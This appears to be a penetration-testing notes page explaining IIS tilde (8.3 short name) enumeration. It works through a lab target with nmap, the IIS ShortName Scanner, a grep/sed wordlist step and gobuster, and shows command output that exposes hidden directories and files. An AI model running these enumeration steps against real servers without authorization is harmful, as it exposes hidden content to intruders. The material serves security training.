---
description: >-
  IIS tilde directory enumeration is a technique utilised to uncover hidden
  files, directories, and short file names on some versions of IIS web servers
---

# IIS Tilde Enumeration

* Windows generates short file name in 8.3 format when a file or folder is created on IIS server
* Contains 8 characters, . , and 3 characters for extesion.
* The tilde (`~`) character, followed by a sequence number, signifies a short file name in a URL.
* IIS tilde directory enumeration sends HTTP requests to the server with distinct character combinations to identify valid short file names.

The enumeration process starts by sending requests with various characters following the tilde:

```http
http://example.com/~a
http://example.com/~b
http://example.com/~c
...
```

Assume the server contains a hidden directory named SecretDocuments. When a request is sent to `http://example.com/~s`, the server replies with a `200 OK` status code, revealing a directory with a short name beginning with "s". The enumeration process continues by appending more characters:

```http
http://example.com/~se
http://example.com/~sf
http://example.com/~sg
...
```

For instance, if the short name `secre~1` is determined for the concealed directory SecretDocuments, files in that directory can be accessed by submitting requests such as:

```http
http://example.com/secre~1/somefile.txt
http://example.com/secre~1/anotherfile.docx
```

After obtaining the short names, those files can be directly accessed using the short names in the requests.

```http
http://example.com/secre~1/somefi~1.txt
```

The numbers following the tilde (`~`) assist the file system in differentiating between files that share similarities in their names, ensuring each file has a distinct 8.3 short file name.

* `somefi~1.txt` for `somefile.txt`
* `somefi~2.txt` for `somefile1.txt`

### Enumeration

```shell-session
nmap -p- -sV -sC --open 10.129.224.91

Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-14 19:44 GMT
Nmap scan report for 10.129.224.91
Host is up (0.011s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.38 seconds
```

IIS 7.5 is running on port 80. Executing a tilde enumeration attack on this version could be a viable option.

**Tilde Enumeration using IIS ShortName Scanner**

```shell-session
java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Do you want to use proxy [Y=Yes, Anything Else=No]? 
# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
Target: http://10.129.204.231/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): /~1/
|_ Extra information:
  |_ Number of sent requests: 553
  |_ Identified directories: 2
    |_ ASPNET~1
    |_ UPLOAD~1
  |_ Identified files: 3
    |_ CSASPX~1.CS
      |_ Actual extension = .CS
    |_ CSASPX~1.CS??
    |_ TRANSF~1.ASP
```

**Generate Wordlist**

```shell-session
egrep -r ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt
```

<table data-header-hidden><thead><tr><th width="138"></th><th></th></tr></thead><tbody><tr><td><strong>Command Part</strong></td><td><strong>Description</strong></td></tr><tr><td><code>egrep -r ^transf</code></td><td>search for lines containing a specific pattern in the input files. The <code>-r</code> flag indicates a recursive search through directories. The <code>^transf</code> pattern matches any line that starts with "transf". The output of this command will be lines that begin with "transf" along with their source file names.</td></tr><tr><td><code>|</code></td><td>The pipe symbol (<code>|</code>) is used to pass the output of the first command (<code>egrep</code>) to the second command (<code>sed</code>). In this case, the lines starting with "transf" and their file names will be the input for the <code>sed</code> command.</td></tr><tr><td><code>sed 's/^[^:]*://'</code></td><td>find-and-replace out of<code>egrep</code>. The expression tells <code>sed</code> to find any sequence of characters at the beginning of a line (<code>^</code>) up to the first colon (<code>:</code>), and replace them with nothing (removing the matched text). The result will be the lines starting with "transf" but without the file names and colons.</td></tr><tr><td><code>> /tmp/list.txt</code></td><td>The greater-than symbol (<code>></code>) is used to redirect the output of the entire command (i.e., the modified lines) to a new file named <code>/tmp/list.txt</code>.</td></tr></tbody></table>

**Gobuster Enumeration**

```shell-session
gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp
```



![](<../../../.gitbook/assets/image (15) (3).png>)



